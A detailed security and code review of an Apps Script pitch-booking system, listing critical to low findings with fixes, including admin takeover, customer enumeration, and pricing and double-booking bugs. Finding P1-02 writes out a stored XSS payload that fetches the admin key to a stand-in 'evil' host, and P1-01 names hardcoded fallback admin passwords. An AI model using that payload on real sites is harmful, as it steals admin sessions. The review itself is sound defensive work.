# San Siro Booking System — Comprehensive Code Review

**Review date:** 2026-11-04
**Scope:** entire repository (backend `.gs`, `Index.html`, `Admin.html`, `public/` PWA wrapper, CI, Vercel config, docs)
**Method:** static review only. No code was executed (Google Apps Script cannot run locally). Line numbers refer to the files as reviewed.
**Review phases:** Phase 1 = core/security/config · Phase 2 = business logic & data integrity · Phase 3 = player/admin frontend · Phase 4 = PWA/infrastructure/CI/docs.

---

## Severity legend

| Severity | Meaning |
|---|---|
| **CRITICAL** | Direct security breach, data loss/corruption, or the admin panel can be taken over. Fix before any production use. |
| **HIGH** | Broken core workflow, double-booking, wrong money numbers, or a serious availability/privacy issue. |
| **MEDIUM** | Incorrect behavior in realistic edge cases, scalability risk, or defense-in-depth gap. |
| **LOW** | UX, maintainability, docs, cosmetic, or minor robustness issues. |

## Executive summary

The project has a good structural foundation: constants/enums, a settings repository, a lock around the booking transaction, salted PIN hashing, an Arabic RTL UI, self-tests, and documentation. However, the review found **8 critical issues** that make the current deployment unsafe: the admin panel is effectively open by default, the admin key can be stolen through a stored XSS, any phone number can be used to enumerate customer names, the booking endpoint accepts slots that were never offered, the `Remaining_Cash` array formula conflicts with row writes, the admin can confirm an already-rebooked slot, deposit math can disagree with the sheet formula, and the admin UI renders the same stored XSS from Phase 1.

| Phase | Critical | High | Medium | Low | Total |
|---|---:|---:|---:|---:|---:|
| 1. Core / security / config | 5 | 4 | 6 | 3 | 18 |
| 2. Business logic & data | 2 | 6 | 7 | 3 | 18 |
| 3. Frontend (player + admin) | 1 | 3 | 8 | 7 | 19 |
| 4. PWA / infra / CI / docs | 0 | 2 | 4 | 8 | 14 |
| **Total** | **8** | **15** | **25** | **21** | **69** |

> Counts are approximate because some findings span phases; the IDs are unique.

### Top 10 things to fix first (in order)

1. Remove the hardcoded admin fallback passwords and the password hint in `Admin.html` (P1-01).
2. Escape player names in the admin dashboard (P1-02).
3. Stop returning names/status from `lookupCustomer` to unauthenticated callers (P1-03).
4. Remove the admin key from the URL, stop persisting it in `sessionStorage`, and add admin-login rate limiting (P1-04).
5. Resolve the `Remaining_Cash` array-formula vs `appendRow` conflict (P1-05).
6. Validate `pitchId`, `date`, and `timeSlot` server-side against generated slots, and reject past slots (P1-06).
7. Prevent `adminSetStatus` from confirming an expired/rebooked slot (P2-01).
8. Make the booking write path consistent on partial failure (P2-02).
9. Fix the "today's slots disappear before opening time" bug (P2-03).
10. Expose pending-deposit bookings for all dates in the admin UI (P2-04).

---

# Phase 1 — Core, configuration & security

## CRITICAL

### P1-01 — Admin panel is open by default (hardcoded fallback passwords + public hint + no rate limit)
**Files:** `Security.gs:281-305`, `Admin.html:368-371`, `Security.gs:313-322`, `Code.gs:26-36`

`isAdminAuthorized()` accepts the configured `ADMIN_KEY`, the sheet `Admin_Password`, **and always** `sansiro2026`, `admin123`, `1234`. The login screen publicly prints the default `sansiro2026`. `verifyAdminKey()` has no rate limiting. Anyone who opens `?page=admin` can read the default password and log in unless the owner both changes the sheet password **and** the hardcoded fallbacks are removed (they never are).

**Impact:** Full read/write access to all bookings/customers, ability to confirm/cancel bookings and mark no-shows. This is a complete admin takeover on a default deployment.
**Fix:** Delete the fallback list. If `ADMIN_KEY`/sheet password is missing, fail closed with a clear setup error. Add brute-force lockout (IP + global) to `verifyAdminKey`. Remove the password hint from `Admin.html`. Store only a hash (or use the `ADMIN_KEY` token) instead of plaintext.

### P1-02 — Stored XSS: a player-supplied name executes in the admin dashboard
**Files:** `Code.gs:411-412, 508-517`, `AdminApi.gs:55-75`, `Admin.html:684-697`

`verifyAndBook` accepts a free-text `name` for new customers and stores it in `Bookings!G` (and `Customers!B`). `getAdminDashboard` returns it, and `Admin.html` inserts `m.playerName` (and `m.status`, `m.timeSlot`) directly into `innerHTML`:

```js
<span>${m.playerName}</span>
```

A player can book with the name `<img src=x onerror="fetch('https://evil/?k='+sessionStorage.getItem('SANSIRO_ADMIN_KEY'))">`. The owner opens the dashboard, the payload runs in the Apps Script origin, and the admin key is exfiltrated from `sessionStorage`.

**Impact:** Critical: public unauthenticated user → admin account compromise.
**Fix:** Use `textContent`/`createElement` for all dynamic fields, or an `escapeHtml()` helper (escape `& < > " '`) for every interpolation into `innerHTML`/attributes. Apply the same helper to `m.status`, `m.timeSlot`, `b.dayName`, `b.pitchId`, `b.status`, and any sheet-derived value. Add a max length + character policy server-side (e.g. 60 chars, letters/spaces/Arabic). Also escape names in the monthly email (`Reports.gs:154`).

### P1-03 — Unauthenticated customer enumeration and PII leak via `lookupCustomer`
**Files:** `Code.gs:292-371`

`lookupCustomer(phone)` is a public RPC. For any Egyptian phone it returns the customer's **name** and category (`TRUSTED_PIN`, `TRUSTED_SETUP`, `NEW_KNOWN`, `BLOCKED`), plus `remainingAttempts`. It also distinguishes registered vs unregistered phones.

**Impact:** Anyone can enumerate phone numbers and harvest names/status (privacy / harassment / social engineering). Revealing whether a phone is registered also enables targeted attacks.
**Fix:** Do not return the name until the PIN is verified. Change the response to a generic state (`NEEDS_PIN`, `NEEDS_REGISTRATION`, `BLOCKED`) without name. Alternatively require a one-time SMS/WhatsApp challenge. Rate-limit the endpoint per phone and per IP.

### P1-04 — Admin key exposure and ineffective logout
**Files:** `Code.gs:27-31`, `Setup.gs:660-680`, `Admin.html:493, 531-532, 567-571`

The admin key is a URL query parameter (`?page=admin&key=…`). It is passed into the page template and stored in `sessionStorage` in plaintext. `logoutAdmin()` only clears `sessionStorage` and `ADMIN_KEY`; a page reload re-reads the key from the URL, so logout is cosmetic. Keys leak via browser history, shared links/screenshots, and Vercel access logs (the wrapper preserves the query string in the top-level URL).

**Impact:** Anyone with the link has permanent admin access. XSS (P1-02) turns this into direct theft. Key rotation breaks every saved bookmark.
**Fix:** Prefer a login form + short-lived server-side session token (Script Properties/Cache) instead of a URL key. If the key must be in the URL, remove it with `history.replaceState` after reading it, use `sessionStorage` only for the tab, and implement a real logout (rotate the session token). Do not log query strings. Never store the raw password/key in `sessionStorage`; store a random session ID.

### P1-05 — `Remaining_Cash` array formula conflicts with every booking write
**Files:** `Setup.gs:180-183`, `Code.gs:545-563, 593-611`, `AdminApi.gs:226-244, 283-301`

`setupBookingsSheet` puts an `ARRAYFORMULA` in `K1` that spills into `K2:K`. But every new row is appended with a value in column K (`finalPrice`, `Math.max(0, finalPrice - depositAmt)`, `finalPrice`, `0`). Writing into a spill range blocks/breaks the array formula (the formula can show `#REF!` or stop expanding), and the two sources of truth disagree.

**Impact:** `Remaining_Cash` can be wrong or `#REF!`; admin "expected cash", reports, and the WhatsApp reminder all depend on it. High chance of silent financial misreporting. The `Math.max(0, …)` clamp also disagrees with the formula when `deposit > price` (formula can go negative).
**Fix:** Choose one owner. Either (a) remove the K array formula and write K values from the server for every row, or (b) do not write column K in `appendRow` (write `''`) and make the formula the only source, with a clamp: `MAX(0, I2:I - N(J2:J))`. Keep the header as plain text instead of a formula literal.

## HIGH

### P1-06 — `verifyAndBook` trusts client-supplied `timeSlot`; no slot/past validation
**Files:** `Code.gs:401-467, 535-537`

The server validates phone, PIN, pitch, and date, but never checks that `timeSlot` is one of the generated slots for that pitch/date, that it is within operating hours, or that it has not already started. `parseSlotStart` returns `0` for unparseable input, so a crafted request can:
- book a non-existent slot label (blocks nothing, appears in admin/report as a booking);
- book **today's already-past** slot;
- choose a label that does not match the slot actually charged, or send garbage to get the day rate for a night slot.

**Impact:** Price manipulation, phantom bookings, double-booking of real slots (a fake label doesn't collide with the real one), and bookings in the past.
**Fix:** Generate the canonical slot list on the server (`openHour`, `closeHour`, `slotMinutes`), require an exact match, compute the price from the canonical start minute, and reject slots whose start (minus grace) is in the past. Do the same in `adminAddBooking`/`adminBlockSlot`.

### P1-07 — Customer account takeover when a Trusted customer has no PIN
**Files:** `Triggers.gs:148-162`, `Code.gs:338-352, 488-505`

`applyBookingConfirmation` creates admin/walk-in customers as `Trusted` with an **empty PIN**. `lookupCustomer` then returns `TRUSTED_SETUP`, and the first person who enters that phone number in the booking flow can set the PIN — no verification that they own the phone. The same applies to `verifyAndBook` when `storedHash` is empty and `isSettingPin` is true.

**Impact:** Any admin-created customer (common for phone/walk-in bookings) can be hijacked by someone who knows the phone number. Combined with P1-03 (phone enumeration), this is practical.
**Fix:** Treat "Trusted but no PIN" as unverified; require an out-of-band challenge (WhatsApp/SMS code or owner-issued one-time code) before setting the PIN. At minimum, do not auto-create Trusted accounts with an empty PIN from walk-ins; use `New` until the PIN is set.

### P1-08 — Booking writes are not atomic and can leave a successful booking behind an error response
**Files:** `Code.gs:520-570, 611`, `AdminApi.gs:244-249`

All writes are inside `LockService`, but `LockService` is not a transaction. In the Trusted path the code appends the booking row, then separately updates `TOTAL_BOOKINGS` and `LAST_BOOKING_DATE`. If either customer update throws (quota, sheet protected, concurrent edit), the outer `catch` returns `BOOKING_ERROR` to the player, but the booking and slot block already exist. The player sees a failure, retries, and gets `SLOT_TAKEN`. A new-customer row can also be appended and then the price/booking step can fail, leaving an orphan customer.

**Impact:** Users are told the booking failed when it succeeded; support burden and duplicate attempts. Data can be partially updated.
**Fix:** Make the critical write first and treat post-write side effects as best-effort (log, don't fail the booking). Better: write a single booking row only after all validation/pricing is complete, and update customer stats in a separate try/catch that cannot roll back the user-visible result. Add an idempotency key so retries return the existing booking.

### P1-09 — Admin key and PIN salt are generated with a weak RNG
**Files:** `Setup.gs:571-583, 533-551`

`generateSecureRandomToken` uses `Math.random()` + timestamp + `Session.getTemporaryActiveUserKey()` and hashes it. `Math.random()` is not cryptographically secure and its state can be predicted. The same function generates `PIN_SALT` and `ADMIN_KEY`.

**Impact:** A predictable admin key weakens the only protection on the admin API; a predictable salt weakens PIN hashing.
**Fix:** Use `Utilities.getUuid()` (or several UUIDs) as the entropy source, or fetch OS randomness if available; do not rely on `Math.random()`. Rotate existing keys/salts and force a PIN reset if the salt changes.

### P1-10 — Four-digit PIN hashed with a single fast SHA-256; global salt
**Files:** `Security.gs:79-133`

Only 10,000 PINs exist. A single SHA-256 of `globalSalt:phone:pin` is trivially brute-forced offline if the sheet or salt leaks (10k hashes). The salt is global, so one rainbow table covers all users.

**Impact:** If the spreadsheet is ever exposed (shared, exported, backup leak), PINs are recoverable in seconds. PINs protect booking history/cancellation and are reused by players elsewhere.
**Fix:** Use per-user random salt + a slow KDF (Apps Script has no bcrypt/Argon2; iterate SHA-256 thousands of times, or store a random per-user salt and derive with many rounds). Add a max-attempt counter persisted in the sheet (not only cache) and force PIN reset on suspicion.

### P1-11 — No admin login rate limiting / lockout
**Files:** `Security.gs:313-322`

`verifyAdminKey` can be called repeatedly with no delay. Combined with the default password and no attempt logging, this is an unlimited oracle. (Listed separately from P1-01 because it remains a risk even after fallbacks are removed if the owner chooses a weak password.)

**Fix:** Cache/Properties attempt counters per source (and globally), exponential backoff, lockout after 5 failures, alert the owner. Consider a longer random key only, not a human password.

## MEDIUM

### P1-12 — Settings `|| default` silently ignores legitimate zero values
**Files:** `Config.gs:190-211`

Every numeric setting uses `Number(raw) || default`. Setting `Deposit_Amount=0` (free booking), `Booking_Days_Ahead=0`, `No_Show_Threshold=0`, or `Lock_Minutes=0` is impossible — they silently become 50/7/2/15. Negative values are accepted. This is surprising for an owner editing the sheet.

**Fix:** Use a helper that checks `raw === '' || raw === undefined` before falling back, and validate ranges (e.g. `0 <= deposit <= price`, `1 <= slotMinutes <= 180`, `open < close`, `lock >= 1`). Log a warning and use the default on invalid input.

### P1-13 — `parseConfigHour` mishandles Date cell values for closing time
**Files:** `Config.gs:128-147`

If the owner types `02:00 AM` into `Close_Hour`, Google Sheets may store it as a `Date` (1899-12-30 02:00). The `instanceof Date` branch returns `2` immediately and **skips** the `isCloseHour` adjustment, so `closeHour=2 < openHour=14`; `getAvailableSlots` computes negative operating minutes and shows no slots at all. The same risk applies to `Open_Hour`/`Night_Start_Hour` values stored as time/date.

**Impact:** A normal owner action can take the booking grid offline.
**Fix:** Normalize Date/Time values through the same AM/PM + close-hour logic (extract hours and apply the `h += 24` rule), and validate `closeHour > openHour` after parsing. Add a self-test for Date inputs.

### P1-14 — Timezone handling is fragile outside the manifest timezone
**Files:** `Config.gs:239-286, 363-388`, `Code.gs:589-590`, `Triggers.gs:38`

`nowInCairo()` builds a `Date` from a Cairo-formatted string, then reads `getHours()` in the **script's** timezone. `addDays`/`dayNameAr` construct local dates and format them in Cairo. `Lock_Expiration` is stored as a Cairo wall-clock string without an offset and parsed with `new Date(...)`. All of this is only correct while the script timezone is exactly `Africa/Cairo`. If the Apps Script project setting differs from `appsscript.json` (common after a manual project move), dates shift by the offset and locks expire at the wrong time.

**Fix:** Store timestamps as ISO UTC (`new Date().toISOString()`) and compare epoch millis; use `Utilities.formatDate` only for display; compute Cairo "today" via formatDate and avoid reparsing into local `Date`. Add a startup assertion that the script timezone matches `TIMEZONE_CAIRO`.

### P1-15 — Settings cache keeps a changed admin password valid for 5 minutes
**Files:** `Config.gs:116-117, 214-220, 226-228`, `Security.gs:291-297`

`getSettings()` caches the whole object (including `adminPassword`) for 300 seconds. Changing the password in the sheet does not take effect until the cache expires; `clearSettingsCache()` is only called by setup. An old password remains valid for up to 5 minutes after a rotation.

**Fix:** Invalidate the cache on edit to `Pricing_Settings` (onEdit handler), reduce TTL, or read the admin password directly (uncached) on login.

### P1-16 — Plaintext admin password in the sheet and in cached settings
**Files:** `Setup.gs:288`, `Config.gs:192`, `Security.gs:291-297`

The default sheet row stores `Admin_Password` in plaintext, and `getSettings()` exposes it to every server function (only `getInitData` is careful to not return it). Anyone with sheet access or an accidental object dump sees it.

**Fix:** Store a hash (or use only `ADMIN_KEY` kept in Script Properties). If a human password is required, hash it with a per-install salt and compare hashes. Avoid putting it in the shared settings object.

### P1-17 — Error responses leak internal exception messages
**Files:** `Code.gs:140, 278, 369, 648, 738, 817`, `AdminApi.gs:143, 164, 256, 304, 365`, `Reports.gs` logs

Almost every catch returns `'…: ' + e.message` to the client. This can expose sheet names, ranges, quota errors, and implementation details, and produces confusing mixed Arabic/English messages for players.

**Fix:** Log the technical error server-side with an error ID; return a stable Arabic message plus the error ID. Keep the raw message only in `Logger`/Stackdriver.

### P1-18 — Configuration edge cases produce zero slots or wrong prices
**Files:** `Config.gs:383-385`, `Code.gs:169-183`, `Pricing.gs:22-40`

- `parseSlotStart` adds 24h to any hour `< openHour` when `openHour >= 12`. If the owner opens at 12:00, a legitimate `12:00 PM` slot becomes 36:00; if open at 10:00, `11:00 AM` becomes 35:00.
- `slotMinutes` that does not divide the operating window silently drops the tail (`Math.floor`).
- Negative/zero `slotMinutes` (after the `||` default, zero becomes 60) or `closeHour <= openHour` yields an empty grid with no warning.
- An invalid `pitchId` defaults to Pitch 1 pricing.

**Fix:** Validate settings at load and fail with an actionable Arabic setup message. Only add 24h when the parsed hour is genuinely in the post-midnight part of the operating day (e.g. `hour < openHour && hour < 12 && openHour >= 12`), and reject `openHour < 12` confusion explicitly. Validate that the window is divisible by `slotMinutes`, or include the remainder.

## LOW

### P1-19 — Dead code and duplicated helpers
- `renderUnauthorizedPage()` (`Code.gs:51-82`) is never called (the admin route always renders the login page).
- `readAllRowsWithIndex()` (`Config.gs:540-557`) is unused.
- `ACTIVE_STATUSES` (`Config.gs:101-105`) is unused; occupancy checks are duplicated inline in three places.
- `isValidPinFormat` duplicates the Arabic-digit conversion in `normalizePinInput` (`Security.gs:30-69`).
- `state.initData.lockMinutes`, `state.initData.vodafoneCashNumber`, `bookedCount` returned by `getAvailableSlots` are unused by the UI.
- `Admin.html`'s `showLoginView`/`showDashboardView` are fine, but `IS_PRE_AUTHORIZED` is redundant with `ADMIN_KEY.length > 0`.

**Impact:** Maintenance risk and drift (e.g. occupancy logic now exists in three copies).
**Fix:** Remove dead code; extract `isSlotOccupied(row, date, pitch, slot, now)` used by `getAvailableSlots`, `verifyAndBook`, and `adminAddBooking`.

### P1-20 — Missing admin-login confirmation and audit trail
`ADMIN_KEY`/password usage is not logged (who logged in when, failed attempts). For a system that handles money and customer data, there is no audit trail for status changes either (only `Cancelled_At`).

**Fix:** Add an `Audit_Log` sheet (timestamp, actor, action, bookingId, old→new) and log confirmations, cancellations, no-shows, blocks, and admin logins (success/failure). Do not log secrets.

### P1-21 — No protection against secret leakage in `Logger`
**Files:** `Setup.gs:541, 547, 561`

`setupSecurityBootstrap`/`rotateAdminKey` log the admin key; `hashPin` logs nothing (good), but the key in Stackdriver is sensitive. Restrict log access or log only a prefix (e.g. first 4 chars) and a fingerprint.

---

# Phase 2 — Business logic, pricing, triggers & reporting

## CRITICAL

### P2-01 — `adminSetStatus` can confirm an expired/rebooked slot → double booking
**Files:** `AdminApi.gs:323-357`, `Code.gs:201-217, 455-465`

Admin "Confirm Pending Deposit" blindly sets `Confirmed` and clears `Lock_Expiration`. It never checks whether the lock already expired and the slot was rebooked by another player (the trigger may be down or delayed), nor whether another active row exists for the same pitch/date/slot. The slot-availability check in `verifyAndBook` treats an expired pending row as free, so this sequence is realistic:

1. Player A books 8 PM, does not pay; lock expires but `releaseExpiredLocks` has not run yet.
2. Player B books the same 8 PM; the code sees A's pending row expired and allows it (P2-05).
3. Owner confirms A from the dashboard/sheet.
4. Two confirmed bookings for 8 PM.

**Impact:** Double-booked pitch, angry customers, refunds, and the dashboard shows both as valid.
**Fix:** In `adminSetStatus` (and `onEditTrigger`), if transitioning to `Confirmed`, run the same availability check as `verifyAndBook`, excluding the row being confirmed. If another active booking exists, reject with a clear message ("الفترة محجوزة بالفعل — يرجى إلغاء الحجز الآخر أولاً"). Also refuse to confirm a pending row whose lock has expired without an explicit owner override flag.

### P2-02 — `Remaining_Cash`/deposit arithmetic can disagree (deposit > price)
**Files:** `Code.gs:591-604`, `Setup.gs:181-183`, `AdminApi.gs:58-59`, `Reports.gs:59-60`

The server clamps pending `Remaining_Cash` to `Math.max(0, price - deposit)`, but the K array formula computes `I - J` without clamping, so a discount that makes the price lower than the fixed deposit produces a negative remaining cash. Admin/report code uses `Number(K) || Math.max(0, price - deposit)`, which also converts a legitimate `0` into a positive fallback.

**Impact:** Reported cash can be wrong (negative or overstated), and the player's payment instructions can disagree with the sheet.
**Fix:** Single source with `MAX(0, I - J)` in the formula and in server code; use a `numberOr(value, fallback)` helper that only falls back on `null`/`''`/`NaN`, never on `0`. Validate `depositAmount <= min price` when saving settings.

## HIGH

### P2-03 — Today's available slots all disappear between midnight and opening time
**Files:** `Code.gs:222-231, 252-255`

```js
var cHour = nowCairo.getHours();
if (cHour < openHour && openHour >= 12) cHour += 24;
currentCairoMinutes = cHour * 60 + nowCairo.getMinutes();
```

At 03:00 with `openHour=14`, `cHour` becomes 27, so every slot of **today** (14:00–26:00) satisfies `startMinutes - 10 < 1620` and is filtered out. But 14:00 is later today and should be bookable. The rule only makes sense for a booking date that is "yesterday's operating day", not for the selected calendar date.

**Impact:** The entire day looks sold out for anyone browsing between 00:00 and 14:00 — often the time owners/players plan. Direct lost bookings.
**Fix:** Compare against the current minute-of-day without adding 24 when `cleanDate === today`. For slots after midnight (`startMinutes >= 1440`), only mark them past if `now` is actually after that time on the same calendar day; at 03:00, 25:00 is still in the future. A clean approach: build the slot's absolute timestamp for the selected date in Cairo and compare epochs.

### P2-04 — Pending deposits for future dates cannot be confirmed in the admin UI
**Files:** `AdminApi.gs:78-80, 128-141`, `Admin.html:672-681, 624`

`getAdminDashboard` collects `pendingReview` across **all** dates, and the KPI shows the count, but the UI never renders `pendingReview`. The Today tab only renders `selectedMatches` (today) and its confirm button appears only there; the Tomorrow tab intentionally has no confirm button. A pending booking for a date two days out is therefore visible only as a number, and the owner must open Google Sheets to confirm it.

**Impact:** New-customer bookings (the main source of deposits) routinely go unconfirmed; the 15-minute lock expires and the slot is lost. This breaks the core "confirm the deposit" workflow.
**Fix:** Render a "Pending deposits" section from `pendingReview` at the top of the dashboard (all dates), or add a date selector and pass `targetDate` to `getAdminDashboard` (the parameter exists but is unused). Add confirm/cancel buttons there. Include the date and countdown in each card.

### P2-05 — Expired pending rows are treated inconsistently, enabling duplicate rows
**Files:** `Code.gs:206-217, 455-465`, `AdminApi.gs:197-211`, `Triggers.gs:32-45`

- `getAvailableSlots`/`verifyAndBook` treat an expired `Pending Deposit` row as free (correct), but leave the old row in place and append a new one for the same slot.
- `adminAddBooking` treats **any** `Pending Deposit` row as occupied, even if expired, so the admin cannot book a slot the player-facing UI shows as free.
- `releaseExpiredLocks` later marks the old row `Expired`, but if the admin confirms it first, P2-01 occurs.

**Impact:** Duplicate rows, inconsistent availability between player/admin, and double-booking risk. Reports/dashboards become noisy.
**Fix:** Before creating a new booking, reuse/expire the stale row (or mark it expired synchronously) instead of appending a duplicate. Centralize the "is this row still holding the slot" rule and apply it everywhere, including admin.

### P2-06 — Customer statistics are not idempotent (double counting)
**Files:** `Triggers.gs:128-166, 176-220`, `AdminApi.gs:342-354`, `Code.gs:566-570`

`applyBookingConfirmation` increments `TOTAL_BOOKINGS` and promotes `New → Trusted` **every time it is called**. `applyBookingNoShow` increments `NO_SHOW_COUNT` every time. `adminSetStatus` calls them on every matching transition, including a no-op `Confirmed → Confirmed` or `No-Show → No-Show`, and `adminAddBooking` calls `applyBookingConfirmation` at creation and again if the owner later confirms the row. `revertBookingNoShow` decrements the counter but does not restore the previous status (`Trusted`/`New`).

**Impact:** Inflated booking counts/penalties, premature blocking, incorrect "top players", and a customer wrongly downgraded/blocked. A blocked player cannot book online until an admin edits the sheet.
**Fix:** Only run side effects on a real transition (`oldStatus !== newStatus`), and make each function idempotent (e.g. store a `stats_applied` flag per booking, or derive counts from Bookings instead of incrementing). When reverting a no-show, restore the previous status based on the remaining count (`>= blockThreshold` → Blocked, `>= noShowThreshold` → New, else Trusted).

### P2-07 — `onEditTrigger` mishandles multi-cell edits and races with the booking lock
**Files:** `Triggers.gs:66-114`

`e.oldValue` is only populated for single-cell edits. For a multi-row paste/fill, `oldValue` is `undefined`, so every row whose status is now `Confirmed`/`No-Show` is treated as a transition and the side effects are applied again (P2-06). The handler is also **not** wrapped in `withLock`, so it can race with `verifyAndBook`/`adminSetStatus` and corrupt customer rows or double-increment counters. It reads the full row and writes one cell at a time for each row.

**Impact:** Duplicate stats and lost updates; slow execution on large pastes.
**Fix:** Use a `withLock` (or a dedicated script lock) around the handler, and only act on single-row edits or compare against a stored previous status. Batch reads (`getValues`) and writes (`setValues`). Handle `e.value`/`e.oldValue` being undefined safely.

### P2-08 — Reports count maintenance blocks as matches and revenue hours
**Files:** `Reports.gs:64-77`, `Setup.gs:431-477`, `AdminApi.gs:271-301`

`adminBlockSlot` stores maintenance as `Owner Reserved` with price 0. `computeMonthStats` counts **all** `Owner Reserved` rows as `confirmedMatchesCount`, pitch hours, and (0) revenue. The Monthly_Reports sheet's `COUNTIFS` counts only `Confirmed`, so the email and the sheet dashboard disagree. Pitch utilization is inflated by every maintenance block and can exceed 100%.

**Impact:** Inaccurate KPIs and owner decisions (revenue, utilization, match count). The monthly email looks different from the sheet the owner checks.
**Fix:** Add a dedicated status (or a `Source='Maintenance'`/`Is_Block` flag) for blocks, exclude it from match/revenue/hours, and align the email with the sheet formulas. Cap utilization at 100% and document the definition.

### P2-09 — Pitch "hours" assume every booking is exactly 60 minutes
**Files:** `Reports.gs:72-76, 99-102`, `Setup.gs:465-477`

Both the email and sheet count one booking as one hour. If `Slot_Minutes` is 30/45/90, utilization and "hours" are wrong. Multi-slot bookings are not modeled. The denominator uses `closeHour - openHour` in hours, ignoring the actual slot count.

**Impact:** Wrong utilization percentages and capacity planning.
**Fix:** Compute hours as `COUNT * slotMinutes / 60` (per pitch), or store a `Duration_Minutes` column. Derive the denominator from the same slot generation logic (including the tail/remainder policy).

### P2-10 — Admin manual booking/blocking accepts unvalidated input
**Files:** `AdminApi.gs:175-259, 271-307`

`adminAddBooking` does not validate `pitchId` (anything other than Pitch 1 is priced as Pitch 1 and grouped under Pitch 2), does not range-check the date, accepts any `timeSlot`, accepts a negative/`Infinity` `customPrice`, and stores an invalid phone (`phone || 'حجز هاتفي'`) without validation. `adminBlockSlot` does not validate pitch/date/slot and does not check whether the slot is already booked, so it can create a second active row for the same slot. Neither writes an audit note.

**Impact:** Typos create invisible/incorrect bookings, negative prices, double occupancy, and broken reports.
**Fix:** Reuse a single `validateAdminBookingInput` (pitch enum, normalized date within an owner-configurable horizon, canonical slot, price >= 0, phone valid if provided). For blocking, reject if an active booking exists (or require an explicit override) and store a distinct maintenance marker. Add an audit log.

## MEDIUM

### P2-11 — Booking ID counter can reset and collide; Script Properties grow unbounded
**Files:** `Code.gs:383-392`

`COUNTER_YYYYMMDD` starts at 100 and increments in Script Properties. If the properties store is cleared/migrated, counters restart and IDs repeat; there is no uniqueness check against the sheet. One property key is created per booking date forever (quota: 500 KB total; years of dates are fine but unbounded).

**Impact:** Duplicate `Booking_ID`s, which break `findBookingRow`, cancellation, and admin actions (it returns the first match). Restoring a backup can also reissue IDs.
**Fix:** On generation, check the sheet for an existing ID and retry; or use a collision-resistant ID (timestamp + random suffix) while keeping a readable prefix; or store counters in one sheet row with a lock. Clean up old date counters.

### P2-12 — `getMyBookings` shows expired pending bookings as active
**Files:** `Code.gs:697-728`

The filter includes any `Pending Deposit` row with `rDate >= today`, without checking `Lock_Expiration`. A player sees an "active" booking whose lock has already elapsed and can cancel it; the slot may already be rebooked. The status/label is misleading.

**Impact:** Confusing UX and a cancellation that affects nothing; support calls.
**Fix:** For pending rows, if `Lock_Expiration` is in the past, show `Expired` (and optionally hide it), and do not offer cancel/confirm actions. Alternatively run the same expiry check used by `getAvailableSlots`.

### P2-13 — No per-customer booking limit or CAPTCHA; slot-lock denial of service
**Files:** `Code.gs:401-651`

The public booking endpoint accepts any valid Egyptian phone and creates a customer + pending booking. There is no limit per phone, per IP, or per time window. An attacker can lock every slot with fake phones and never pay; `releaseExpiredLocks` frees them after 15 minutes, but the attacker can repeat, exhausting slots and sheet rows. There is no CAPTCHA or proof of phone ownership.

**Impact:** Competitors or vandals can deny bookings and bloat the sheet; Apps Script quotas can be exhausted (also via `getAvailableSlots`, P2-14).
**Fix:** Limit active pending bookings per phone (e.g. 1) and per IP/session; require a one-time code or WhatsApp verification before creating a pending booking; add a simple human check for first-time customers; rate-limit public RPCs.

### P2-14 — Public RPCs are expensive and unthrottled
**Files:** `Code.gs:153-280, 292-371, 664-740`, `AdminApi.gs:23-145`, `Reports.gs:21-116`

Every `getAvailableSlots` call reads the entire Bookings sheet (11 columns) and the entire Discounts sheet; every `lookupCustomer`/`getMyBookings` scans the full Customers/Bookings sheet; `getAdminDashboard` reads all bookings. `verifyAndBook` holds a global lock while reading all bookings, settings, and discounts. With thousands of rows and normal traffic this becomes slow and risks the 6-minute execution limit and daily quotas.

**Impact:** Timeouts during peak booking hours; lock contention; quota exhaustion by a single abuser.
**Fix:** Cache read-only data (slots per pitch/date) with short TTL; maintain an index/map (e.g. a `Slot_Index` sheet or a cached JSON of active bookings); read only the needed columns/ranges; batch writes; keep the lock hold time minimal (pre-compute outside the lock where safe); add quotas/rate limits.

### P2-15 — `generateBookingId`/`appendRow` inside the lock but price/discount reads also inside
**Files:** `Code.gs:427-538`, `Pricing.gs:147-154`

`verifyAndBook` loads settings, reads discounts, and computes price **inside** the lock. If the cache is cold or the sheet is slow, every booking serializes behind these reads. `getPriceForSlot` in `adminAddBooking` also reloads discounts inside the lock. This increases the chance of `LockService` timeouts (20 s) under load.

**Impact:** "النظام مشغول" errors during busy periods; reduced throughput.
**Fix:** Read settings/discounts and validate before acquiring the lock; inside the lock only re-check availability and write. Or use a shorter lock scope plus a unique slot constraint.

### P2-16 — Date normalization is permissive and inconsistent
**Files:** `Config.gs:274-286`, `Code.gs:159-166`, `AdminApi.gs:182`

`normalizeDateCell` accepts any string, converts `/` to `-`, strips at `T`, but does not validate `YYYY-MM-DD`. A value like `2026-1-5`, `5/1/2026`, or a serial number produces a string that compares incorrectly in `>=`/`<=` (date range checks and reports silently skip/ include wrong rows). Admin date input is ISO, but sheet edits can break it.

**Fix:** Parse and re-format to a canonical `YYYY-MM-DD`; reject invalid input with a clear error. Use `Utilities.formatDate` for Date objects and a strict regex + `Date` round-trip for strings. Add tests for `2026-1-5`, `2026/01/05`, empty, and serial numbers.

### P2-17 — `getAdminDashboard` mixes historical/inactive rows into "today" and "tomorrow" lists
**Files:** `AdminApi.gs:47-117`

The grouping loops add every row with a matching date, regardless of status (including `Cancelled`, `Expired`, `No-Show`, and maintenance). The UI renders them as cards; cancelled/no-show rows clutter the operational view, and the `pendingReview` count includes expired pending rows. `todayExpectedCash` also sums a selected date that the UI never changes and labels it "today".

**Impact:** The owner sees a noisy list, may act on stale rows, and the KPI label can be wrong if `targetDate` is ever used.
**Fix:** Filter the operational lists to active statuses (`Pending Deposit`, `Confirmed`, `Owner Reserved`), optionally show a collapsed "history" section. Exclude expired pending rows from `pendingReview` or compute their effective status. Rename KPIs to match `selectedDate`.

## LOW

### P2-18 — `adminSetStatus` leaves stale `Cancelled_At` and lacks transition rules
**Files:** `AdminApi.gs:342-356`

Re-confirming a cancelled booking leaves the old `Cancelled_At`; switching to `No-Show` doesn't clear it either. Any sequence is allowed (e.g. `Expired → Confirmed`, `No-Show → Confirmed` without reverting stats). There is no state-machine validation.

**Fix:** Define allowed transitions and clear/set timestamps accordingly (`Cancelled_At` only for cancelled; `No-Show` timestamp if desired). On revert, restore prior status and stats (P2-06).

### P2-19 — Maintenance rows generate broken WhatsApp reminders and phone links
**Files:** `AdminApi.gs:97-109`, `AdminApi.gs:283-299`, `Config.gs:447-454`

Maintenance rows have `Player_Phone='-'`, so `normalizePhone` returns `''` and `toWhatsAppNumber` returns `''`; the dashboard still builds `https://wa.me/?text=…` and `tel:-`. The reminder text calls the block a "match" and includes "remaining cash 0".

